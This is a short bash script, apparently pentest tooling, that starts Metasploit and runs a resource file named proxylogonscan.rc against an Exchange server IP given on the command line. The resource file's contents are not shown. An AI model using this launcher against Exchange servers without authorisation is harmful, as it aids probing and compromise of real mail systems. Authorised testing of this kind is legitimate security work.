#!/bin/bash

# Function to display usage
usage() {
    echo -e "\nSyntax: proxylogon.sh <Exchange Server IP>"
    echo "Example: ./proxylogon.sh 10.10.10.10\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Check if the required number of arguments was provided
if [ $# -ne 1 ]; then
    usage
    exit 1
fi

EXCHANGE_SERVER_IP="$1"

# Check for required tools (msfdb and msfconsole)
if ! command -v msfdb &> /dev/null || ! command -v msfconsole &> /dev/null; then
    echo "Error: Metasploit tools not found."
    exit 1
fi

# Check if MSF script file exists
MSF_SCRIPT="./msfscripts/proxylogonscan.rc"
if [ ! -f "$MSF_SCRIPT" ]; then
    echo "Error: MSF script file $MSF_SCRIPT not found."
    exit 1
fi

echo "Starting Metasploit Database"
msfdb start

echo "Starting Metasploit Console and executing ProxyLogon script"
msfconsole -q -x "setg RHOSTS $EXCHANGE_SERVER_IP; resource $MSF_SCRIPT"


